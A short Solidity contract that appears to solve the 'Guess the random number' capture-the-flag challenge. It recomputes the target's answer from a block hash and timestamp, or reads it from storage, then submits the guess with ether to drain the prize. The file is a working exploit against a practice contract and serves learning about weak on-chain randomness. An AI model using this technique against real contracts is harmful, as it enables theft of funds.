// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./GuessTheRandomNumberChallenge.sol";

contract Attack {
    GuessTheRandomNumberChallenge src;

    uint256 blockNumber = 0;
    uint256 timeStamp = 0;

    // blockNumber - get from etherscan for GuessTheRandomNumberChallenge
    // timeStamp - get from etherscan for GuessTheRandomNumberChallenge
    //
    // OR use
    //
    // const number = BigNumber.from(
    //   await contract.provider.getStorageAt(contract.address, 0)
    // )

    constructor(address _src) {
        src = GuessTheRandomNumberChallenge(_src);
    }

    function attack(uint8 _answer) public payable {
        uint8 answer = _answer;
        if (_answer == 0) {
            answer = uint8(keccak256(block.blockhash(blockNumber), timeStamp));
        }

        src.guess.value(msg.value)(answer);
        require(address(this).balance == 2 ether);
    }

    function() payable {}
}
